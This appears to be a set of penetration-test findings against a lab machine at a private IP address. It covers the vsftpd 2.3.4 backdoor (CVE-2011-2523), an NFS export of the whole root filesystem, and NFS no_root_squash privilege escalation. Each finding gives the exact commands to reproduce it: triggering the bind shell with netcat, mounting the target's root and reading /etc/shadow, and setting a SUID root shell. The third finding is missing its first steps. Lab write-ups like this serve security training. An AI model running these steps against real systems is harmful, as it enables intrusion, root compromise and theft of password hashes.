1. VSFTPD 2.3.4 Backdoor (Port 21)
RCE Backdoor Root Shell

## Summary:

A malicious backdoor was introduced into the vsftpd-2.3.4.tar.gz archive. If a username ends with :), a shell listener is triggered on port 6200.

## Steps To Reproduce:

  1. Connect to FTP: telnet 192.168.99.131 21
  2. Send Username: USER backdoored:)
  3. Send Password: PASS anypass
  4. Connect to the shell using Netcat: nc -nv 192.168.99.131 6200

## Supporting Material/References:

  • Exploit-DB ID: 17491
  • CVE-2011-2523

7. NFS Unrestricted Root Export (Port 2049)
Data Leak Broken Access Control

## Summary:

The Network File System (NFS) is configured to export the entire root directory (/) to any system that requests it. This allows anyone to mount the target's hard drive and read/write any file, including sensitive system files.

## Steps To Reproduce:

  1. Check exports from your Kali machine: showmount -e 192.168.99.131
  2. Create a local directory: mkdir /tmp/victim_root
  3. Mount the target: mount -t nfs 192.168.99.131:/ /tmp/victim_root
  4. You now have full access. For example: cat /tmp/victim_root/etc/shadow

## Supporting Material/References:

  • Misconfiguration: / * (rw,no_root_squash) in /etc/exports

68. NFS No_Root_Squash Privilege Escalation

## Summary:

The NFS share is exported with no_root_squash. This means if a remote user connects as root, they are treated as the local root user. An attacker can use this to upload an SUID binary and execute it on the target to gain a root shell.

## Steps To Reproduce:

  3. Set SUID permissions: chmod +s /tmp/mountpoint/tmp/rootshell
  4. On the target machine, run /tmp/rootshell -p to become root.
